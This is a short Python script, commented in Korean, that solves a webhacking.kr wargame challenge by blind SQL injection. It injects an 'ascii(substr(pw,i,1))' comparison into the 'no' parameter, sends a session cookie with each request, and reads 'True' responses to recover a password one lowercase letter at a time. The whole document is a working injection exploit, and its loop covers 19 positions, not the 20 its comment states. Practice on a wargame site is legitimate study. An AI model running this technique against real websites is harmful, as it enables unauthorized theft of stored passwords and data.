from http import client
  
conn = client.HTTPConnection('webhacking.kr',80)
headers = {'Cookie': 'PHPSESSID=b3443541331e3ff78d360b76cd4b4fbd'} # 풀이자 본인의 세션 값을 입력하면 됨
base="http://webhacking.kr/challenge/bonus/bonus-1/index.php?no="
  
tryList=[]
awsList=[]
  
  
for i in range(97,123): # 아스키 코드 값(영문 소문자) 기반으로 문자열을 정리한다.
    tryList.append(chr(i))
      
for i in range(1,20): # id의 문자열이 20개이므로 20번 반복해 준다.
    for w in tryList:
    
        url="2+and+ascii%28substr%28pw%2c"+str(i)+"%2c1%29%29%3d"+hex(ord(w))+""
 
        # print(base+url)
 
        conn.request('PUT', base+url,'',headers)
        res = conn.getresponse()
        resData=res.read()  # 가져온 페이지의 데이터를 읽는다.
        strRes = str(resData.decode()) # 가져온 페이지의 데이터를 문자열로 형변환한다.
         
        # print(strRes)
 
        n = strRes.find("True") # 찾은 문자열에 해당하는 인덱스가 담긴다.
         
        if(n != -1) : # 해당 문자열을 찾았을 경우 (-1은 찾지 못한 경우를 말함)
            print("i="+str(i)+" pw="+hex(ord(w)) + " " + w)
            awsList.append(w)
            print(str(awsList))
            break
         
 
 
print("정답은"+str(awsList)+"입니다.")
conn.close()
